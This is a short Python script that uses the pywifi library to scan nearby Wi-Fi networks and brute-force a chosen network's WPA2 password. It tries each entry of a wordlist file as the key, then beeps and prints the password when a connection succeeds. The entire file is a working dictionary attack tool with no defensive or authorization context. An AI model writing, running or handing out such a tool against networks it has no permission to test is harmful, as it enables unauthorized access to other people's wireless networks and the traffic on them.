from pywifi import const, PyWiFi,Profile
from time import sleep
from winsound import Beep # just for Windows

def scan(): # For Scan the area
    interface.scan()
    sleep(8)
    result = interface.scan_results()
    return result

def testwifi(ssid , password):
    interface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.connect(interface.add_network_profile(profile))
    sleep(1)
    if interface.status() == const.IFACE_CONNECTED:
        interface.remove_network_profile(profile)
        return True
    else:
        interface.remove_network_profile(profile)
        return False
        
        
wifi = PyWiFi() # Wifi Object
interface = wifi.interfaces()[0] # Select First Wireless Interface CARD

passlist = "dict.txt" # Password List

print("Scanning ... ")
APs = scan()

for i in range(len(APs)):
    print("{} - {}".format(i+1 ,APs[i].ssid))

index = int(input("\n>> "))
target = APs[index-1]

for password in open(passlist):
    password = password.strip("\n")
    print("Testing : {}".format(password))
    if testwifi(target.ssid , password) : # Test for connection using password
        Beep(700 , 500) # Boooooghhh (just for windows)
        Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
        print("-" *30)
        print("PASSWORD : {}".format(password))
        print("-" *30)
        break

input()
